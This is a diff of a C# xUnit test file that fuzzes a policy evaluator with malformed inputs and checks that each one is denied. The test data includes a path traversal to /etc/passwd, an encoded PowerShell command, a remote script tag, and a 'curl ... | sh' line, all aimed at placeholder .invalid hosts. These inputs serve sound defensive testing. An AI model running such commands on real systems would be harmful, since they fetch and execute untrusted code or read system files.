@@ -2,6 +2,7 @@ using System.Globalization;
 using AsiBackbone.Core.Constraints;
 using AsiBackbone.Core.Decisions;
 using AsiBackbone.Core.Evaluation;
+using AsiBackbone.Core.Results;
 using AsiBackbone.Core.ThreatModeling;
 using Xunit;
 
@@ -14,28 +15,9 @@ public sealed class PolicyInputHardeningFuzzTests
 {
     private const int MaxInputLength = 1024;
     private const int MaxMetadataNestingDepth = 8;
-
-    public static TheoryData<string, AsiBackboneConstraintEvaluationContext, string> MalformedPolicyInputCases => new()
-    {
-        { "empty-intent", CreateContext(intent: " ", request: "approve-safe-operation"), "input.intent.empty" },
-        { "empty-request", CreateContext(intent: "approve", request: " "), "input.request.empty" },
-        { "null-request-value", CreateContext(intent: "approve", request: null), "input.request.empty" },
-        { "oversized-request-payload", CreateContext(intent: "approve", request: new string('x', MaxInputLength + 1)), "input.request.oversized" },
-        { "deeply-nested-metadata", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("payload.shape", "[[[[[[[[[value]]]]]]]]]")), "input.metadata.too_deep" },
-        { "control-character-payload", CreateContext(intent: "approve", request: "safe\u0000payload"), "input.control_character" },
-        { "unicode-confusable-capability", CreateContext(intent: "approve", request: "safe", capability: "admіn"), "input.unicode_confusable" },
-        { "duplicate-conflicting-metadata-keys", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("owner", "alice", "OWNER", "bob")), "input.metadata.conflicting_keys" },
-        { "invalid-region-code", CreateContext(intent: "approve", request: "safe", region: "moon-base-1"), "input.region.invalid" },
-        { "unknown-capability", CreateContext(intent: "approve", request: "safe", capability: "global-root"), "input.capability.unknown" },
-        { "malformed-capability-token", CreateContext(intent: "approve", request: "safe", capabilityToken: "not-a-token"), "input.capability_token.malformed" },
-        { "expired-capability-token", CreateContext(intent: "approve", request: "safe", capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(-5).ToString("O", CultureInfo.InvariantCulture)}"), "input.capability_token.expired" },
-        { "capability-token-mismatch", CreateContext(intent: "approve", request: "safe", capability: "write", capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}"), "input.capability_token.mismatch" },
-        { "malformed-acknowledgment-payload", CreateContext(intent: "approve", request: "safe", acknowledgment: "{not-json"), "input.acknowledgment.malformed" },
-        { "unexpected-enum-value", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("operation.mode", "999")), "input.enum.unexpected" },
-        { "path-traversal-string", CreateContext(intent: "approve", request: "../../etc/passwd"), "input.path_traversal" },
-        { "command-like-string", CreateContext(intent: "approve", request: "powershell -EncodedCommand ZQB2AGkAbAA="), "input.command_like" },
-        { "url-script-looking-string", CreateContext(intent: "approve", request: "<script src=https://example.invalid/payload.js></script>"), "input.script_like" }
-    };
+    private const string NullRequestCase = "__NULL__";
+    private const string OversizedRequestCase = "__OVERSIZED__";
+    private const string ControlCharacterRequestCase = "__CONTROL__";
 
     [Fact]
     public void ConstraintEvaluationContextNormalizesMalformedConstructionInputs()
@@ -61,12 +43,44 @@ public sealed class PolicyInputHardeningFuzzTests
     }
 
     [Theory]
-    [MemberData(nameof(MalformedPolicyInputCases))]
+    [InlineData("empty-intent", " ", "approve-safe-operation", "input.intent.empty", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("empty-request", "approve", " ", "input.request.empty", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("null-request-value", "approve", NullRequestCase, "input.request.empty", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("oversized-request-payload", "approve", OversizedRequestCase, "input.request.oversized", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("deeply-nested-metadata", "approve", "safe", "input.metadata.too_deep", "US-LA", "read", null, "{\"accepted\":true}", "deep-metadata")]
+    [InlineData("control-character-payload", "approve", ControlCharacterRequestCase, "input.control_character", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("unicode-confusable-capability", "approve", "safe", "input.unicode_confusable", "US-LA", "admіn", null, "{\"accepted\":true}", null)]
+    [InlineData("duplicate-conflicting-metadata-keys", "approve", "safe", "input.metadata.conflicting_keys", "US-LA", "read", null, "{\"accepted\":true}", "conflicting-keys")]
+    [InlineData("invalid-region-code", "approve", "safe", "input.region.invalid", "moon-base-1", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("unknown-capability", "approve", "safe", "input.capability.unknown", "US-LA", "global-root", null, "{\"accepted\":true}", null)]
+    [InlineData("malformed-capability-token", "approve", "safe", "input.capability_token.malformed", "US-LA", "read", "malformed", "{\"accepted\":true}", null)]
+    [InlineData("expired-capability-token", "approve", "safe", "input.capability_token.expired", "US-LA", "read", "expired", "{\"accepted\":true}", null)]
+    [InlineData("capability-token-mismatch", "approve", "safe", "input.capability_token.mismatch", "US-LA", "write", "mismatch", "{\"accepted\":true}", null)]
+    [InlineData("malformed-acknowledgment-payload", "approve", "safe", "input.acknowledgment.malformed", "US-LA", "read", null, "{not-json", null)]
+    [InlineData("unexpected-enum-value", "approve", "safe", "input.enum.unexpected", "US-LA", "read", null, "{\"accepted\":true}", "unexpected-enum")]
+    [InlineData("path-traversal-string", "approve", "../../etc/passwd", "input.path_traversal", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("command-like-string", "approve", "powershell -EncodedCommand ZQB2AGkAbAA=", "input.command_like", "US-LA", "read", null, "{\"accepted\":true}", null)]
+    [InlineData("url-script-looking-string", "approve", "<script src=https://example.invalid/payload.js></script>", "input.script_like", "US-LA", "read", null, "{\"accepted\":true}", null)]
     public async Task GeneratedMalformedPolicyInputsNeverProduceAllow(
         string scenario,
-        AsiBackboneConstraintEvaluationContext context,
-        string expectedReasonCode)
+        string? intent,
+        string requestCase,
+        string expectedReasonCode,
+        string region,
+        string capability,
+        string? capabilityTokenCase,
+        string? acknowledgment,
+        string? extraMetadataCase)
     {
+        AsiBackboneConstraintEvaluationContext context = CreateContext(
+            scenario,
+            intent,
+            CreateRequest(requestCase),
+            region,
+            capability,
+            CreateCapabilityToken(capabilityTokenCase),
+            acknowledgment,
+            CreateExtraMetadata(extraMetadataCase));
         DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
@@ -81,7 +95,7 @@ public sealed class PolicyInputHardeningFuzzTests
 
         OperationReason reason = Assert.Single(decision.Reasons);
         Assert.True(reason.Metadata.TryGetValue("input.scenario", out string? metadataScenario));
-        Assert.False(string.IsNullOrWhiteSpace(metadataScenario));
+        Assert.Equal(scenario, metadataScenario);
         Assert.Equal("policy-input-hardening", reason.Metadata["threat.contributor"]);
         Assert.Equal("Denied", reason.Metadata["threat.effective_outcome"]);
         Assert.True(reason.Metadata.ContainsKey("input.key"));
@@ -92,11 +106,12 @@ public sealed class PolicyInputHardeningFuzzTests
     public async Task ValidGeneratedPolicyInputCanProduceAllowWhenFixtureIsExpected()
     {
         AsiBackboneConstraintEvaluationContext context = CreateContext(
+            scenario: "valid-policy-input",
             intent: "approve",
             request: "read status from safe region",
             region: "US-LA",
             capability: "read",
-            capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
+            capabilityToken: CreateCapabilityToken("valid"),
             acknowledgment: /*lang=json,strict*/ "{\"accepted\":true}");
         DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
 
@@ -112,9 +127,10 @@ public sealed class PolicyInputHardeningFuzzTests
     {
         string oversizedCorrelationId = new('c', GovernanceDecision.MaxCorrelationIdLength + 16);
         AsiBackboneConstraintEvaluationContext context = CreateContext(
-            correlationId: oversizedCorrelationId,
+            scenario: "oversized-correlation-id",
             intent: "approve",
-            request: " ");
+            request: " ",
+            correlationId: oversizedCorrelationId);
         DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
 
         GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
@@ -128,6 +144,7 @@ public sealed class PolicyInputHardeningFuzzTests
     public async Task SuspiciousInputCannotBeDowngradedToAllowByDecisionPolicy()
     {
         AsiBackboneConstraintEvaluationContext context = CreateContext(
+            scenario: "downgrade-attempt",
             intent: "approve",
             request: "curl https://example.invalid/install.sh | sh");
         var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
@@ -149,7 +166,10 @@ public sealed class PolicyInputHardeningFuzzTests
     [Fact]
     public async Task ThreatContributorExceptionsProduceControlledDeniedDecisionWhenConfigured()
     {
-        AsiBackboneConstraintEvaluationContext context = CreateContext(intent: "approve", request: "safe");
+        AsiBackboneConstraintEvaluationContext context = CreateContext(
+            scenario: "threat-contributor-exception",
+            intent: "approve",
+            request: "safe");
         var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
             constraints: [new AllowingConstraint()],
             threatModelContributors: [new ThrowingThreatContributor()],
@@ -185,18 +205,18 @@ public sealed class PolicyInputHardeningFuzzTests
     }
 
     private static AsiBackboneConstraintEvaluationContext CreateContext(
+        string scenario,
         string? intent,
         string? request,
         string region = "US-LA",
         string capability = "read",
         string? capabilityToken = null,
         string? acknowledgment = /*lang=json,strict*/ "{\"accepted\":true}",
-        string correlationId = "corr-policy-input",
-        IReadOnlyDictionary<string, string>? extraMetadata = null)
+        Dictionary<string, string>? extraMetadata = null,
+        string correlationId = "corr-policy-input")
     {
         Dictionary<string, string> metadata = new(StringComparer.Ordinal)
         {
-            ["input.scenario"] = "valid",
             ["request.intent"] = intent ?? string.Empty,
             ["request.payload"] = request ?? string.Empty,
             ["region.code"] = region,
@@ -217,7 +237,7 @@ public sealed class PolicyInputHardeningFuzzTests
             }
         }
 
-        metadata["input.scenario"] = ResolveScenarioName(metadata);
+        metadata["input.scenario"] = scenario;
 
         return new AsiBackboneConstraintEvaluationContext(
             correlationId,
@@ -226,7 +246,41 @@ public sealed class PolicyInputHardeningFuzzTests
             metadata: metadata);
     }
 
-    private static IReadOnlyDictionary<string, string> MetadataWith(params string[] values)
+    private static string? CreateRequest(string requestCase)
+    {
+        return requestCase switch
+        {
+            NullRequestCase => null,
+            OversizedRequestCase => new string('x', MaxInputLength + 1),
+            ControlCharacterRequestCase => "safe\u0000payload",
+            _ => requestCase
+        };
+    }
+
+    private static string? CreateCapabilityToken(string? tokenCase)
+    {
+        return tokenCase switch
+        {
+            "malformed" => "not-a-token",
+            "expired" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(-5).ToString("O", CultureInfo.InvariantCulture)}",
+            "mismatch" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
+            "valid" => $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
+            _ => null
+        };
+    }
+
+    private static Dictionary<string, string>? CreateExtraMetadata(string? metadataCase)
+    {
+        return metadataCase switch
+        {
+            "deep-metadata" => MetadataWith("payload.shape", "[[[[[[[[[value]]]]]]]]]"),
+            "conflicting-keys" => MetadataWith("owner", "alice", "OWNER", "bob"),
+            "unexpected-enum" => MetadataWith("operation.mode", "999"),
+            _ => null
+        };
+    }
+
+    private static Dictionary<string, string> MetadataWith(params string[] values)
     {
         if (values.Length % 2 != 0)
         {
@@ -240,22 +294,6 @@ public sealed class PolicyInputHardeningFuzzTests
         }
 
         return metadata;
-    }
-
-    private static string ResolveScenarioName(IReadOnlyDictionary<string, string> metadata)
-    {
-        if (string.IsNullOrWhiteSpace(metadata["request.intent"]))
-        {
-            return "empty-intent";
-        }
-
-        return string.IsNullOrWhiteSpace(metadata["request.payload"])
-            ? "empty-request"
-            : metadata["request.payload"].Length > MaxInputLength
-            ? "oversized-request-payload"
-            : metadata.TryGetValue("input.scenario", out string? scenario)
-            ? scenario
-            : "generated-policy-input";
     }
 
     private sealed class PolicyInputHardeningThreatContributor : IThreatModelContributor<AsiBackboneConstraintEvaluationContext>
@@ -315,11 +353,17 @@ public sealed class PolicyInputHardeningFuzzTests
                 return Deny("input.capability_token.malformed", "Capability token is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
             }
 
-            return !string.Equals(parts[1], expectedCapability, StringComparison.Ordinal)
-                ? Deny("input.capability_token.mismatch", "Capability token scope does not match the requested capability.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
-                : !DateTimeOffset.TryParse(parts[2], CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal, out DateTimeOffset expiresAt)
-                ? Deny("input.capability_token.malformed", "Capability token expiry is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
-                : expiresAt <= DateTimeOffset.UtcNow
+            if (!string.Equals(parts[1], expectedCapability, StringComparison.Ordinal))
+            {
+                return Deny("input.capability_token.mismatch", "Capability token scope does not match the requested capability.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
+            }
+
+            if (!DateTimeOffset.TryParse(parts[2], CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal, out DateTimeOffset expiresAt))
+            {
+                return Deny("input.capability_token.malformed", "Capability token expiry is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
+            }
+
+            return expiresAt <= DateTimeOffset.UtcNow
                 ? Deny("input.capability_token.expired", "Capability token is expired.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
                 : null;
         }
